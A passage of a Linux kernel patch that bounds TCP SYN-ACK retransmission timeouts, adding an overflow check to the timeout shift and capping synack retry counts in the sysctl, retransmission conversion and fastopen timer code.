++static inline unsigned long tcp_reqsk_timeout_sk(const struct sock *sk,
++						 struct request_sock *req)
+ {
+-	u64 timeout = (u64)req->timeout << req->num_timeout;
++	u32 rto_max = tcp_rto_max(sk);
++	u64 timeout = req->timeout;
++
++	if (req->num_timeout >= BITS_PER_TYPE(timeout) ||
++	    timeout > U64_MAX >> req->num_timeout)
++		return rto_max;
++
++	return (unsigned long)min_t(u64, timeout << req->num_timeout, rto_max);
++}
+ 
+-	return (unsigned long)min_t(u64, timeout,
+-				    tcp_rto_max(req->rsk_listener));
++static inline unsigned long tcp_reqsk_timeout(struct request_sock *req)
++{
++	return tcp_reqsk_timeout_sk(req->rsk_listener, req);
+ }
+ 
+ u32 tcp_delack_max(const struct sock *sk);
+diff --git a/net/ipv4/sysctl_net_ipv4.c b/net/ipv4/sysctl_net_ipv4.c
+index ca1180dba1dea..fc5152dfa3c86 100644
+--- a/net/ipv4/sysctl_net_ipv4.c
++++ b/net/ipv4/sysctl_net_ipv4.c
+@@ -35,6 +35,7 @@ static int ip_ttl_min = 1;
+ static int ip_ttl_max = 255;
+ static int tcp_syn_retries_min = 1;
+ static int tcp_syn_retries_max = MAX_TCP_SYNCNT;
++static int tcp_synack_retries_max = MAX_TCP_SYNACK_RETRIES;
+ static int tcp_syn_linear_timeouts_max = MAX_TCP_SYNCNT;
+ static unsigned long ip_ping_group_range_min[] = { 0, 0 };
+ static unsigned long ip_ping_group_range_max[] = { GID_T_MAX, GID_T_MAX };
+@@ -1034,6 +1035,7 @@ static struct ctl_table ipv4_net_table[] = {
+ 		.maxlen		= sizeof(u8),
+ 		.mode		= 0644,
+ 		.proc_handler	= proc_dou8vec_minmax,
++		.extra2		= &tcp_synack_retries_max,
+ 	},
+ #ifdef CONFIG_SYN_COOKIES
+ 	{
+diff --git a/net/ipv4/tcp.c b/net/ipv4/tcp.c
+index 455441f1b6949..24896fa08a5d8 100644
+--- a/net/ipv4/tcp.c
++++ b/net/ipv4/tcp.c
+@@ -357,7 +357,7 @@ static u8 secs_to_retrans(int seconds, int timeout, int rto_max)
+ 		int period = timeout;
+ 
+ 		res = 1;
+-		while (seconds > period && res < 255) {
++		while (seconds > period && res < MAX_TCP_SYNACK_RETRIES) {
+ 			res++;
+ 			timeout <<= 1;
+ 			if (timeout > rto_max)
+diff --git a/net/ipv4/tcp_timer.c b/net/ipv4/tcp_timer.c
+index bf171b5e1eb30..daa4eac072dd9 100644
+--- a/net/ipv4/tcp_timer.c
++++ b/net/ipv4/tcp_timer.c
+@@ -462,11 +462,13 @@ static void tcp_fastopen_synack_timer(struct sock *sk, struct request_sock *req)
+ 
+ 	tcp_syn_ack_timeout(req);
+ 
+-	/* Add one more retry for fastopen.
++	/* Add one more retry for fastopen when the timeout counter can
++	 * represent it.
+ 	 * Paired with WRITE_ONCE() in tcp_sock_set_syncnt()
+ 	 */
+ 	max_retries = READ_ONCE(icsk->icsk_syn_retries) ? :
+ 		READ_ONCE(sock_net(sk)->ipv4.sysctl_tcp_synack_retries) + 1;
++	max_retries = min_t(int, max_retries, MAX_TCP_SYNACK_RETRIES);
+ 
+ 	if (req->num_timeout >= max_retries) {
+ 		tcp_write_err(sk);
+@@ -488,7 +490,7 @@ static void tcp_fastopen_synack_timer(struct sock *sk, struct request_sock *req)
+ 	if (!tp->retrans_stamp)
+ 		tp->retrans_stamp = tcp_time_stamp_ts(tp);
+ 	tcp_reset_xmit_timer(sk, ICSK_TIME_RETRANS,
+-			  req->timeout << req->num_timeout, false);
++			     tcp_reqsk_timeout_sk(sk, req), false);
+ }
+ 
+ static bool tcp_rtx_probe0_timed_out(const struct sock *sk,
 -- 
 2.43.0
 
